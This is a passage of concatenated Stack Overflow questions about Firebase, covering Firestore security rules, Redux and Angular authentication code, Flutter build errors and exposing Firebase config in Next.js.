<p>Will the rules validate twice? Will I get charged for that <code>get</code> in rules twice?</p>
"
"<p>I'm making an application to practice with redux and various data states</p>
<p><a href=""https://i.stack.imgur.com/8mlIL.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/8mlIL.jpg"" alt=""application appearance"" /></a></p>
<p>The idea is that an unregistered user can add cryptocurrency assets, view statistics and all that. If the user is registered, then the added assets should be saved and be in the list when logging in again</p>
<p>for this I decided to use Firebase Authentication and manage states using redux</p>
<p>I came across a situation where interaction with firebase proceeds correctly, the user is created, then the login form sees them and correctly consolidates them, but my hook, which was made to determine whether the user is logged in or not, does not work correctly</p>
<p><a href=""https://i.stack.imgur.com/dRCf5.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/dRCf5.jpg"" alt=""inside firebase"" /></a></p>
<p>store</p>
<pre><code>export const store = configureStore({
    reducer: {
        user: userReducer,
    },
});

export type RootState = ReturnType&lt;typeof store.getState&gt;;
export type AppDispatch = typeof store.dispatch;
</code></pre>
<p>slice</p>
<pre><code>const initialState = {
    email: null,
    token: null, 
    id: null,
}

const userSlice = createSlice({
    name: 'user',
    initialState,
    reducers: {
        setUser(state, action) {
            state.email = action.payload.email;
            state.token = action.payload.token;
            state.id = action.payload.id;
        },
        removeUser(state) {
            state.email = null;
            state.token = null;
            state.id = null;
        }
    }
})

export const {setUser, removeUser} = userSlice.actions;

export default userSlice.reducer
</code></pre>
<p>useAuth hook</p>
<pre><code>export function useAuth() {
    const {email, token, id} = useAppSelector(state =&gt; state.user);
    console.log('is auth work', email, token, id)
    return {
        isAuth: !!email, 
        email,
        token,
        id,
    };
}
</code></pre>
<p>Login form
here you can see that I was already a little desperate and added isAuth to dispatch</p>
<pre><code>interface LoginFormProps {
    onSignUp: () =&gt; void;
    onClose: () =&gt; void;
}

type FieldType = {
    email?: string;
    password?: string;
    remember?: string;
};

export function LoginForm({ onSignUp, onClose }: LoginFormProps) {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [rememberMe, setRememberMe] = useState(false);
    const dispatch = useAppDispatch();

    const onFinish = (email: string, password: string) =&gt; {
        const auth = getAuth();
        signInWithEmailAndPassword(auth, email, password)
            .then(({user}) =&gt; {
                dispatch(setUser({
                    isAuth: true,
                    email: user.email,
                    id: user.uid,
                    token: user.refreshToken,
                }))
                console.log('user', user);
            })
            .catch();
    };

    const onFinishFailed = (errorInfo: any) =&gt; {
        console.log('Failed:', errorInfo);
    };

    return (
        &lt;Form
            name=&quot;basic&quot;
            labelCol={{ span: 4 }}
            wrapperCol={{ span: 18 }}
            layout=&quot;horizontal&quot;
            initialValues={{ remember: true }}
            onFinish={() =&gt; {onFinish(email, password); onClose()}}
            onFinishFailed={onFinishFailed}
            autoComplete=&quot;off&quot;
        &gt;
            &lt;Form.Item&lt;FieldType&gt;
                label=&quot;Email&quot;
                name=&quot;email&quot;
                rules={[{ required: true, message: 'Please input your email!' }]}
            &gt;
                &lt;Input
                    value={email || ''}
                    onChange={(e) =&gt; { setEmail(e.target.value) }}
                /&gt;
            &lt;/Form.Item&gt;

            &lt;Form.Item&lt;FieldType&gt;
                label=&quot;Password&quot;
                name=&quot;password&quot;
                rules={[{ required: true, message: 'Please input your password!' }]}
            &gt;
                &lt;Input.Password
                    value={password || ''}
                    onChange={(e) =&gt; { setPassword(e.target.value) }}
                /&gt;
            &lt;/Form.Item&gt;

            &lt;Form.Item&lt;FieldType&gt;
                name=&quot;remember&quot;
                valuePropName=&quot;checked&quot;
                wrapperCol={{ span: 18 }}
            &gt;
                &lt;Checkbox
                    value={rememberMe}
                    onChange={(e) =&gt; { setRememberMe(e.target.checked) }}
                &gt;Remember me&lt;/Checkbox&gt;
            &lt;/Form.Item&gt;

            &lt;Flex gap={12}&gt;
                &lt;Form.Item wrapperCol={{ span: 18 }}&gt;
                    &lt;Button type=&quot;primary&quot; htmlType=&quot;submit&quot;&gt;
                        Log In
                    &lt;/Button&gt;
                &lt;/Form.Item&gt;
                &lt;Button type=&quot;primary&quot; onClick={onSignUp}&gt;Sign Up&lt;/Button&gt;
            &lt;/Flex&gt;
        &lt;/Form&gt;
    )
}
</code></pre>
<p><a href=""https://i.stack.imgur.com/xPekW.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/xPekW.jpg"" alt=""here is what the console shows me"" /></a></p>
<p>This is the place where it is important for me that isAuth works correctly and I absolutely don’t understand why this doesn’t happen</p>
<pre><code>export default function Header() {
    const { crypto } = useContext(CryptoContext);
    const [select, setSelect] = useState(false);
    const [showModal, setshowModal] = useState(false);
    const [coin, setCoin] = useState&lt;ICryptoCurrency | null&gt;(null);
    const [showDrawer, setShowDrawer] = useState(false);
    const [showCoinForm, setShowCoinForm] = useState(false);
    const [showLoginForm, setShowLoginForm] = useState(false);
    const [showRegistrationForm, setShowRegistrationForm] = useState(false);

    const {isAuth, email} = useAuth();

    const handleSelect = (value: string) =&gt; {
        const selectedCoin = crypto.find((c) =&gt; c.id === value)
        if (selectedCoin) {
            setshowModal(true);
            setCoin(selectedCoin);
        }
    }

    const handleAddAsset = () =&gt; {
        setShowDrawer(true);
        setShowCoinForm(true);
    }

    const handleRegistration = () =&gt; {
        setShowDrawer(true);
        setShowRegistrationForm(true);
        setShowCoinForm(false);
        setShowLoginForm(false);
    }

    const handleLogin = () =&gt; {
        setShowDrawer(true);
        setShowLoginForm(true);
        setShowRegistrationForm(false);
        setShowCoinForm(false);
    }

    useEffect(() =&gt; {
        const keypress = (event: any) =&gt; {
            if (event.key === '/') {
                setSelect((prev) =&gt; !prev);
            }
        }
        document.addEventListener('keypress', keypress);
        return () =&gt; document.removeEventListener('keypress', keypress);
    }, [])

    const formNames = () =&gt; {
        if (showCoinForm) return 'Add Asset'
        if (showRegistrationForm) return 'Registration'
        if (showLoginForm) return 'Log In'
    }


    return (
        &lt;Layout.Header style={headerStyle}&gt;
            &lt;Select
                open={select}
                onClick={() =&gt; setSelect((prev) =&gt; !prev)}
                style={{ width: '250px' }}
                placeholder=&quot;press / to open&quot;
                onSelect={handleSelect}
                options={crypto.map((coin: ICryptoCurrency) =&gt; (
                    {
                        label: coin.name,
                        value: coin.id,
                        icon: coin.icon
                    }
                ))}
                optionRender={(option) =&gt; (
                    &lt;Space&gt;
                        &lt;img src={option.data.icon} style={{ width: '20px', paddingTop: '6px' }} alt={option.data.id} /&gt;
                        &lt;span&gt; {option.data.label}&lt;/span&gt;
                    &lt;/Space&gt;
                )}
            /&gt;

            &lt;Flex gap={10}&gt;
                &lt;Button onClick={handleAddAsset} style={addButtonStyle}&gt;Add Asset&lt;/Button&gt;
                {isAuth ? (
                    &lt;Avatar icon={&lt;UserOutlined /&gt;} /&gt;
                ) : (
                    &lt;Button onClick={handleLogin} style={addButtonStyle}&gt;Log In&lt;/Button&gt;
                )}
            &lt;/Flex&gt;

            &lt;Modal open={showModal} style={{ maxWidth: '420px' }} onCancel={() =&gt; setshowModal(false)} footer={null}&gt;
                &lt;CryptoModal coin={coin} /&gt;
            &lt;/Modal&gt;

            &lt;Drawer
                width={600}
                destroyOnClose
                title={formNames()}
                onClose={() =&gt; {
                    setShowDrawer(false);
                    setShowCoinForm(false);
                    setShowLoginForm(false);
                    setShowRegistrationForm(false)
                }}
                open={showDrawer}
            &gt;
                {showCoinForm &amp;&amp; (
                    &lt;AddAssetForm onClose={() =&gt; { setShowDrawer(false); setShowCoinForm(false) }} /&gt;
                )}

                {showLoginForm &amp;&amp; (
                    &lt;LoginForm onSignUp={handleRegistration} onClose={() =&gt; setShowDrawer(false)} /&gt;
                )}

                {showRegistrationForm &amp;&amp; (
                    &lt;RegistrationForm onLogin={handleLogin} onClose={() =&gt; setShowDrawer(false)} /&gt;
                )}
            &lt;/Drawer&gt;
        &lt;/Layout.Header&gt;
    )
}
</code></pre>
<p>This is the main problem for now, if I can solve it, I can move on</p>
"
"<p>I want to formulate a firebase security rule where:
a user with a document in the users collection is allowed read in a driver document in the drivers collection;
if there exists <strong>atleast one</strong> document in the travels collection where both the driver and user exist, in the form of userId and driverId parameters.</p>
<p><strong>Documents:</strong></p>
<pre><code>
drivers/id11111111

users/id2222222222

travels/ididididid

</code></pre>
<hr />
<p><strong>travels ididididid document:</strong></p>
<pre><code>
driverId: id11111111

userId: id2222222222

</code></pre>
<p>If the above document exists the id2222222222 user should be allowed to read the id11111111 driver document.</p>
<p>Both driver and user is a different categories of user from Firebase auth.</p>
"
"<pre><code>import { Injectable } from '@angular/core';
import { Observable } from 'rxjs';
import { User } from 'src/app/model/user/User';
import { AngularFireAuth } from '@angular/fire/compat/auth';
import firebase from 'firebase/app'; // Notice the change here

@Injectable({
  providedIn: 'root'
})
export class AuthService {

  constructor(private auth: AngularFireAuth) { }

  login(email: string, password: string): Observable&lt;User&gt; {
    return new Observable&lt;User&gt;(observer =&gt; {
      this.auth.setPersistence(firebase.default.auth.Auth.Persistence.LOCAL).then(() =&gt; {
        this.auth.signInWithEmailAndPassword(email, password).then((firebaseUser:
        firebase.default.auth.UserCredential) =&gt; {
          observer.next({ email, id: firebaseUser.user.uid });
          observer.complete();
        }).catch(error =&gt; {
          observer.error(error);
          observer.complete();
        });
      });
    });
  }
}
</code></pre>
<p>On the first default I got this error:</p>
<blockquote>
<p>Property 'default' does not exist on type 'typeof import(&quot;(folder directory)/node_modules/firebase/app/dist/app/index&quot;)'.ts(2339)</p>
</blockquote>
<p>on the second default I got this error:</p>
<blockquote>
<p>Namespace '&quot;(folder directory) /node_modules/firebase/app/dist/app/index&quot;' has no exported member 'default'.ts(2694)</p>
</blockquote>
<p>I tried all types of imports and I am still getting this error.</p>
"
"<p>I'm experiencing errors recently with trying to compile my Flutter app. It seems the problem is related to the firebase_core package which seems to depend on the leak_tracker and leak_tracker_testing packages.</p>
<p>When I depend on the firebase_core package it doesn't matter which version I select, I get the following errors:</p>
<pre><code>../../../../../.pub-cache/hosted/pub.dev/leak_tracker_testing-2.0.3/lib/src/leak_testing.dart:146:9: Error: No named parameter with the name 'notGCed'.
        notGCed: ignoredLeaks.notGCed.merge(
        ^^^^^^^
../../../../../.pub-cache/hosted/pub.dev/leak_tracker-10.0.4/lib/src/leak_tracking/primitives/model.dart:130:9: Context: Found this candidate, but the arguments don't match.
  const IgnoredLeaks({
        ^^^^^^^^^^^^
../../../../../.pub-cache/hosted/pub.dev/leak_tracker_testing-2.0.3/lib/src/leak_testing.dart:193:9: Error: No named parameter with the name 'notGCed'.
        notGCed: newNotGCed,
        ^^^^^^^
../../../../../.pub-cache/hosted/pub.dev/leak_tracker-10.0.4/lib/src/leak_tracking/primitives/model.dart:130:9: Context: Found this candidate, but the arguments don't match.
  const IgnoredLeaks({
        ^^^^^^^^^^^^
</code></pre>
<p>I tried reinstalling the SDK and upgrading it but nothing seems to fix the issue. I'm lost in trying to find the solution.</p>
<p>Please help me out!</p>
"
"<p>Accidentally started the Firebase Realtime Database in locked mode instead of test mode. Is it possible to change that? Otherwise, how can we see the tree and its nodes as structured by the code? As in my app, I have entered the user's details. Which I want to see.</p>
<p>Unable to delete or disable. Need assistance to switch to test mode for viewing data structure.</p>
"
"<pre><code>rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
      allow read, write
    }
  }
}
</code></pre>
<pre><code>import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:dropdown_button2/dropdown_button2.dart';
import 'package:flutter/material.dart';
import 'package:sharemyrent/userpages/listaproperty/propertydetails.dart';

class ListAProperty extends StatefulWidget {
  const ListAProperty({super.key});

  @override
  State&lt;ListAProperty&gt; createState() =&gt; _ListAPropertyState();
}

class _ListAPropertyState extends State&lt;ListAProperty&gt; {

  int? selectedOption;
  TextEditingController pincodeController = TextEditingController();
  TextEditingController landmarkController = TextEditingController();
  TextEditingController houseController = TextEditingController();
  TextEditingController districtController = TextEditingController();
  TextEditingController stateController = TextEditingController();
  TextEditingController nameController = TextEditingController();
  TextEditingController bhkController = TextEditingController();
  TextEditingController areaController = TextEditingController();
  TextEditingController furnitureController = TextEditingController();

  GlobalKey&lt;FormState&gt; formKey = GlobalKey&lt;FormState&gt;();

  List&lt;String&gt; bhk = [
    &quot;1&quot;,
    &quot;2&quot;,
    &quot;3&quot;,
    &quot;4&quot;,
    &quot;5&quot;,
    &quot;5+&quot;
  ];

  List&lt;String&gt; furnitureType = [
    &quot;Fully Furnished&quot;,
    &quot;Semi Furnished&quot;,
    &quot;Non Furnished&quot;
  ];
  String? selectedValue1;
  String? selectedValue2;

  String getOwnerType(int? option){
   switch (option){
     case 1:
       return &quot;Owner&quot;;

     case 2:
       return &quot;Broker&quot;;

     case 3:
       return &quot;Tenant&quot;;

     default:
       return &quot;&quot;;
   }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFFDDE6E8),
      body: Stack(
        children:[
          Container(
          height: MediaQuery.of(context).size.height,
          width: MediaQuery.of(context).size.width,
          padding: const EdgeInsets.only(left: 25, right: 25),
          child: SingleChildScrollView(
            scrollDirection: Axis.vertical,
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Container(
                  height: 250,
                  width: double.maxFinite,
                  margin: const EdgeInsets.only(bottom: 20),
                  decoration: const BoxDecoration(
                    image: DecorationImage(
                      image: AssetImage(&quot;assets/listaproperty.png&quot;),
                      opacity: 0.8,
                      alignment: Alignment.bottomCenter,
                    ),
                  ),
                ),
                Container(
                  alignment: Alignment.center,
                  margin: const EdgeInsets.only(bottom:0),
                  child: const Text(
                    &quot;Post Your Property&quot;,
                    style: TextStyle(
                      fontWeight: FontWeight.bold,
                      color: Colors.black87,
                      fontFamily: &quot;openSans&quot;,
                      fontStyle: FontStyle.normal,
                      fontSize: 25,
                    ),
                  ),
                ),
                const Divider(
                  color: Colors.black87,
                ),
                const Padding(
                  padding: EdgeInsets.only(top: 8.0),
                  child: Text(
                    &quot;Choose your designation :&quot;,
                    style: TextStyle(
                      fontStyle: FontStyle.normal,
                      fontSize: 16,
                      fontFamily: &quot;openSans&quot;,
                      color: Colors.black87,
                      fontWeight: FontWeight.w600,
                    ),
                  ),
                ),
                Container(
                  height: 60,
                  width: double.maxFinite,
                  margin: const EdgeInsets.only(bottom: 5),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      GestureDetector(
                        onTap: () {
                          setState(() {
                            selectedOption = 1;
                          });
                        },
                        child: SizedBox(
                          height: 40,
                          width: 100,
                          child: Row(
                            children: [
                              Radio(
                                value: 1,
                                groupValue: selectedOption,
                                onChanged: (value) {
                                  setState(() {
                                    selectedOption = value;
                                  });
                                },
                              ),
                              const Text(
                                &quot;Owner&quot;,
                                style: TextStyle(
                                    color: Colors.black87,
                                    fontWeight: FontWeight.w600,
                                    fontFamily: &quot;openSans&quot;,
                                    fontSize: 15,
                                    fontStyle: FontStyle.normal
                                ),
                              )
                            ],
                          ),
                        ),
                      ),
                      GestureDetector(
                        onTap: () {
                          setState(() {
                            selectedOption = 2;
                          });
                        },
                        child: SizedBox(
                          height: 40,
                          width: 100,
                          child: Row(
                            children: [
                              Radio(
                                value: 2,
                                groupValue: selectedOption,
                                onChanged: (value) {
                                  setState(() {
                                    selectedOption = value;
                                  });
                                },
                              ),
                              const Text(
                                &quot;Broker&quot;,
                                style: TextStyle(
                                    color: Colors.black87,
                                    fontWeight: FontWeight.w600,
                                    fontFamily: &quot;openSans&quot;,
                                    fontSize: 15,
                                    fontStyle: FontStyle.normal
                                ),
                              )
                            ],
                          ),
                        ),
                      ),
                      GestureDetector(
                        onTap: () {
                          setState(() {
                            selectedOption = 3;
                          });
                        },
                        child: SizedBox(
                          height: 40,
                          width: 100,
                          child: Row(
                            children: [
                              Radio(
                                value: 3,
                                groupValue: selectedOption,
                                onChanged: (value) {
                                  setState(() {
                                    selectedOption = value;
                                  });
                                },
                              ),
                              const Text(
                                &quot;Tenant&quot;,
                                style: TextStyle(
                                    color: Colors.black87,
                                    fontWeight: FontWeight.w600,
                                    fontFamily: &quot;openSans&quot;,
                                    fontSize: 15,
                                    fontStyle: FontStyle.normal
                                ),
                              )
                            ],
                          ),
                        ),
                      )
                    ],
                  ),
                ),
                const Text(
                  &quot;Enter Address :&quot;,
                  style: TextStyle(
                      fontStyle: FontStyle.normal,
                      fontSize: 15,
                      fontFamily: &quot;openSans&quot;,
                      fontWeight: FontWeight.w600,
                      color: Colors.black87
                  ),
                ),
                const Padding(padding: EdgeInsets.symmetric(vertical: 8)),
                textformfields(
                  containerHeight: 60,
                  containerwidth: double.maxFinite,
                  labeledtext: &quot;Enter House No., Building/Society Name&quot;,
                  hinttext: &quot;e.g. 34, Vrindavan Society&quot;,
                  textControllers: houseController
                ),
                const Padding(padding: EdgeInsets.symmetric(vertical: 5)),
                textformfields(
                    containerHeight: 60,
                    containerwidth: double.maxFinite,
                    labeledtext: &quot;Landmark, Road Name, City&quot;,
                    hinttext: &quot;e.g. opp. Azad Maidan, Mukerjee Nagar, Ahmedabad&quot;,
                    textControllers: landmarkController
                ),
                Padding(
                  padding: const EdgeInsets.only(top: 8.0, bottom: 8.0),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      textformfields(
                          containerHeight: 60,
                          containerwidth: 170,
                          labeledtext: &quot;District&quot;,
                          hinttext: &quot;e.g. Ahmedabad&quot;,
                          textControllers: districtController
                      ),
                      textformfields(
                        containerHeight: 60,
                        containerwidth: 170,
                        hinttext: &quot;State&quot;,
                        labeledtext: &quot;Gujarat&quot;,
                        textControllers: stateController
                      ),
                    ],
                  ),
                ),
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    textformfields(
                      containerHeight: 60,
                      containerwidth: 170,
                      labeledtext: &quot;Pincode&quot;,
                      hinttext: &quot;e.g. 393008&quot;,
                      textControllers: pincodeController
                    ),
                    Container(
                      height: 40,
                      width: 170,
                      margin: const EdgeInsets.only(top: 7.5),
                      alignment: Alignment.center,
                      decoration: BoxDecoration(
                        borderRadius: const BorderRadius.all(Radius.circular(10)),
                        color: const Color(0xFF2D7976).withOpacity(0.8)
                      ),
                      child: const Row(
                        mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                        children: [
                          Icon(
                            Icons.my_location_rounded,
                            color: Colors.white,
                              size: 15,
                          ),
                          Text(
                            &quot;Use Current Location&quot;,
                            style: TextStyle(
                              color: Colors.white,
                              fontWeight: FontWeight.w600,
                              fontFamily: &quot;openSans&quot;,
                              fontSize: 14,
                              fontStyle: FontStyle.normal
                            ),
                          )
                        ],
                      ),
                    )
                  ],
                ),
                const Padding(padding: EdgeInsets.only(top: 15)),
                const Text(
                  &quot;Property Details :&quot;,
                  style: TextStyle(
                    fontWeight: FontWeight.w600,
                    color: Colors.black87,
                    fontSize: 15,
                    fontStyle: FontStyle.normal,
                    fontFamily: &quot;openSans&quot;,
                  ),
                ),
                const Padding(padding: EdgeInsets.only(top: 15)),
                textformfields(
                    containerHeight: 60,
                    hinttext: &quot;Enter Your Full Name&quot;,
                    labeledtext: &quot;Name&quot;,
                    containerwidth: 360,
                    textControllers: nameController
                ),
                const Padding(padding: EdgeInsets.only(top: 20)),
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      mainAxisAlignment: MainAxisAlignment.spaceAround,
                      children: [
                        const Text(
                          &quot;Furniture Type:&quot;,
                          style: TextStyle(
                            fontFamily: &quot;openSans&quot;,
                            fontStyle: FontStyle.normal,
                            fontSize: 15,
                            color: Colors.black87,
                            fontWeight: FontWeight.w600
                          ),
                        ),
                        Container(
                          height: 50,
                          width: 180,
                          margin: const EdgeInsets.only(top: 8),
                          decoration: const BoxDecoration(
                            color: Colors.white,
                            borderRadius: BorderRadius.all(Radius.circular(10)),
                          ),
                          child: DropdownButtonHideUnderline(
                            child: DropdownButton2&lt;String&gt;
                            (
                              dropdownStyleData: DropdownStyleData(
                                decoration: BoxDecoration(
                                  border: Border.all(
                                    color: Colors.black87,
                                    width: 1.5,
                                    style: BorderStyle.solid
                                  ),
                                  borderRadius: const BorderRadius.all(Radius.circular(10)),

                                ),
                              ),
                              isExpanded: false,
                              hint: const Text(
                                &quot;Select&quot;,
                                style: TextStyle(
                                  fontFamily: &quot;openSans&quot;,
                                  fontSize: 14,
                                  fontWeight: FontWeight.w600
                                ),
                              ),
                              value: selectedValue1,
                              onChanged: (value) {
                                setState(() {
                                  selectedValue1 = value;
                                });
                              },
                              items: furnitureType.map(
                                      (String type) =&gt; DropdownMenuItem&lt;String&gt;(
                                        value: type,
                                        child: Text(
                                          type,
                                          style: const TextStyle(
                                            fontFamily: &quot;openSans&quot;,
                                            fontSize: 14
                                          ),
                                        ),
                                      )
                              ).toList()
                            )
                          ),
                        )
                      ],
                    ),
                    Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        const Text(
                          &quot;Area of Property:&quot;,
                          style: TextStyle(
                            fontFamily: &quot;openSans&quot;,
                            fontStyle: FontStyle.normal,
                            fontSize: 15,
                            color: Colors.black87,
                            fontWeight: FontWeight.w600
                          ),
                        ),
                        textformfields(
                            containerHeight: 60,
                            containerwidth: 110,
                            labeledtext: &quot;Area&quot;,
                            hinttext: &quot;e.g. Area&quot;,
                            textControllers: areaController
                        )
                      ],
                    ),
                  ],
                ),
                const Padding(padding: EdgeInsets.only(bottom: 20)),
                const Text(
                  &quot;BHK:&quot;,
                  style: TextStyle(
                      fontFamily: &quot;openSans&quot;,
                      fontStyle: FontStyle.normal,
                      fontSize: 15,
                      color: Colors.black87,
                      fontWeight: FontWeight.w600
                  ),
                ),
                Container(
                  height: 50,
                  width: 180,
                  margin: const EdgeInsets.only(top: 8, bottom: 30),
                  decoration: const BoxDecoration(
                    color: Colors.white,
                    borderRadius: BorderRadius.all(Radius.circular(10)),
                  ),
                  child: DropdownButtonHideUnderline(
                      child: DropdownButton2&lt;String&gt;
                        (
                          style: const TextStyle(
                            fontFamily: &quot;openSans&quot;,
                            color: Colors.black87,
                            fontSize: 15
                          ),
                          dropdownStyleData: DropdownStyleData(
                            decoration: BoxDecoration(
                              border: Border.all(
                                  color: const Color(0xFF2D7976),
                                  width: 2,
                                  style: BorderStyle.solid
                              ),
                              borderRadius: const BorderRadius.all(Radius.circular(10)),
                            ),
                          ),
                          isExpanded: false,

                          hint: const Text(
                            &quot;Select&quot;,
                            style: TextStyle(
                                fontFamily: &quot;openSans&quot;,
                                fontSize: 14,
                                fontWeight: FontWeight.w600
                            ),
                          ),
                          value: selectedValue2,
                          onChanged: (value) {
                            setState(() {
                              selectedValue2 = value;
                            });
                          },
                          items: bhk.map(
                                  (String type) =&gt; DropdownMenuItem&lt;String&gt;(
                                value: type,
                                child: Text(
                                  type,
                                  style: const TextStyle(
                                      fontFamily: &quot;openSans&quot;,
                                      fontSize: 14
                                  ),
                                ),
                              )
                          ).toList()
                      )
                  ),
                ),
                const Text(
                  &quot;Description of the Property :&quot;,
                  style: TextStyle(
                    color: Colors.black87,
                    fontSize: 15,
                    fontWeight: FontWeight.w600,
                    fontFamily: &quot;openSans&quot;,
                    fontStyle: FontStyle.normal
                  ),
                ),

                const Padding(padding: EdgeInsets.only(bottom: 8)),
                textformfields(
                    containerHeight: 180,
                    containerwidth: 400,
                    maxmLines: 7,
                    labeledtext: &quot;&quot;,
                    hinttext: &quot;&quot;
                ),
                const Padding(padding: EdgeInsets.only(bottom: 150))
              ],
            ),
          ),
        ),
          Align(
            alignment: Alignment.bottomCenter,
            child: GestureDetector(
              onTap: () async{
                    await FirebaseFirestore.instance.collection(&quot;Properties&quot;).add({
                      &quot;Address&quot; : &quot;hello&quot;,
                      /*&quot;BHK&quot; : bhkController.text,
                      &quot;furnitureType&quot; : furnitureController.text,
                      &quot;area&quot; : areaController.text,
                      &quot;listerName&quot; : nameController.text,
                      &quot;ownerType&quot; : getOwnerType(selectedOption)*/
                    });
                    print(&quot;Values added successfully&quot;);
                    Navigator.push(context, MaterialPageRoute(builder: (context) =&gt; const PropertyDetails()));

              },
              child: Container(
                height: 50,
                width: double.maxFinite,
                margin: const EdgeInsets.only(bottom: 20, top: 80, left: 20, right: 20),
                alignment: Alignment.center,
                decoration:  BoxDecoration(
                    color: const Color(0xFF2D7976),
                    borderRadius: const BorderRadius.all(Radius.circular(10)),
                    border: Border.all(
                      color: const Color(0xFF2D7976),
                      width: 1.5,
                    )
                ),
                child: const Text(
                  &quot;Continue&quot;,
                  style: TextStyle(
                    color: Colors.white,
                    fontStyle: FontStyle.normal,
                    fontSize: 20,
                    fontFamily: &quot;openSans&quot;,
                    fontWeight: FontWeight.w600,
                  ),
                ),
              ),
            ),
          )
        ]
      ),
    );
  }
  textformfields({
    double? containerHeight,
    double? containerwidth,
    String? labeledtext,
    String? hinttext,
    TextEditingController? textControllers,
    int? maxmLines
  }){
    return Container(
      height: containerHeight!,
      width: containerwidth!,
      alignment: Alignment.center,
      margin: const EdgeInsets.only(top: 8),
      decoration: const BoxDecoration(
          borderRadius: BorderRadius.all(Radius.circular(10)),
          color: Colors.white
      ),
      child: TextFormField(
          decoration: InputDecoration(
            labelText: labeledtext!,
            hintText: hinttext!,
            border: OutlineInputBorder(
              borderSide: BorderSide(
                  color: Colors.black87.withOpacity(0.5),
                  width: 1.2
              ),
              borderRadius: const BorderRadius.all(Radius.circular(10)),
            ),
            hintStyle: const TextStyle(
              color: Colors.black87,
              fontWeight: FontWeight.w500,
              fontFamily: &quot;openSans&quot;,
              fontSize: 15,
              fontStyle: FontStyle.normal,
            ),
            labelStyle: const TextStyle(
                color: Color(0xFF2D7976),
                fontStyle: FontStyle.normal,
                fontSize: 15,
                fontFamily: &quot;openSans&quot;,
                fontWeight: FontWeight.w600
            ),
            enabledBorder: const OutlineInputBorder(
                borderSide: BorderSide(
                  color: Color(0xFF2D7976),
                ),
                borderRadius: BorderRadius.all(Radius.circular(10))
            ),
            focusedBorder: const OutlineInputBorder(
                borderRadius: BorderRadius.all(Radius.circular(10)),
                borderSide: BorderSide(
                    color: Color(0xFF2D7976)
                )
            ),
          ),
          maxLines: maxmLines,
          controller: textControllers,
      ),
    );
  }
}
</code></pre>
<p>For this page</p>
<p>I tried each and every possible permutation by changing the rules in firebase, but the result is same each and every time.</p>
<p>Additionally I tried to write the whole code again by creating a different page thought that some anonymous error must be there, but at last I came to a conclusion that the problem is in firebase database's rule.</p>
<p>Can someone suggest me a good answer?</p>
"
"<p><a href=""https://i.stack.imgur.com/tGC7f.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/tGC7f.png"" alt=""Screenshot from the Firebase Console with the error"" /></a></p>
<p>These are my security rules for Cloud Firestore:</p>
<pre><code>rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /Feedback/{feedback} {
       allow read: if resource.data.uid == request.auth.uid;
    }
  }
}
</code></pre>
<p>It appears that I have a weird bug. When I try to access the documents in the &quot;Feedback&quot; collection, I get with my client a &quot;permissioned denied&quot; error. Using the Firestore Security Rules Playground, I get &quot;Firestore Security Rules: Error running simulation –An unknown error occurred&quot;. I don't see where the issue with the security rules is.</p>
<p>I don't see any logs in my browser console. Already disabled uBlock Origin.</p>
<p>If I only use <code>allow read: if request.auth.uid != null</code> it works. However, I do something with <code>resouce.data</code> it throws an unknown error.</p>
<p>I already had a look into <a href=""https://stackoverflow.com/questions/70106164/error-running-simulation-an-unknown-error-occurred"">Error running simulation — An unknown error occurred</a>. However, there is no solution to the problem.</p>
"
"<p>I am trying to learn how to implement authentication with firebase to my nextjs app. First thing we do while using firebase is initialize our firebase with our configuration (<code>apiKey</code> etc.). If i use any firebase function from a client component, it requires this configuration to be sent to client and i think this is something we should never do?</p>
<p><a href=""https://firebase.google.com/codelabs/firebase-nextjs#5"" rel=""nofollow noreferrer"">https://firebase.google.com/codelabs/firebase-nextjs#5</a>
But in this tutorial of google they do just that? They prefixed <code>.env</code> variables with <code>NEXT_PUBLIC_</code> which makes them available to client components? Would a company like google create a wrong tutorial for their product? Is it okay to send my firebase conf. to client?</p>
<p>If not how can i implement this functionality with server components. I think for sign in and sign out, I can call server actions?</p>
<p>The thing I cant do is how to listen for authentication state and render UI according to that(change sign in button to signout button etc.)</p>
<p>lets assume i have server component navbar:</p>
<pre><code>function Navbar() {
  let signedIn = false;
  auth.onAuthStateChanged((authUser) =&gt; {
    if (authUser) {
    signedIn = true;
    } 
  });
return (
 signedIn ? &lt;SignOutButton /&gt; : &lt;SignInButton /&gt;
 )
}
</code></pre>
<p>I cant use state or useEffect on server component and i dont know declaring normal variable like this would be appropriate?</p>
"
"<p>I'm trying to deploy some firestore security rules, they seem to be working fine on my local emulator, at least the get() functions and all (need more testing but test cases at least passed).</p>
<p>Thing is that the Location in the PLAYGROUND (which is grayed out) is: /databases/null/documents. I can't quite remember but two weeks ago when I got started with it I could use get() functions and I think the location used to be /databases/(default)/documents. Also, resource always results null, like it's pointing to the wrong database location, an empty non-existent one.</p>
<p>I made the rules very tiny to troubleshoot, hence the error I'm getting is: Error running simulation — The path &quot;/databases/null/documents/users/LPS539UITvNF7V6KjGVLEGlbQf93&quot; is improperly formatted. Paths should start with &quot;/databases/$(database)/documents/&quot;</p>
<p><a href=""https://i.stack.imgur.com/OX4hF.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/OX4hF.png"" alt=""Firestore security rules and playground view"" /></a></p>
<p>Already tried:</p>
<ul>
<li>Tried another rule and checked the resource, it's always null.</li>
<li>Already made sure I'm trying to get the right doc, auth also exists, so this is not the cause.</li>
<li>Made the rules as minimal as possible to troubleshoot.</li>
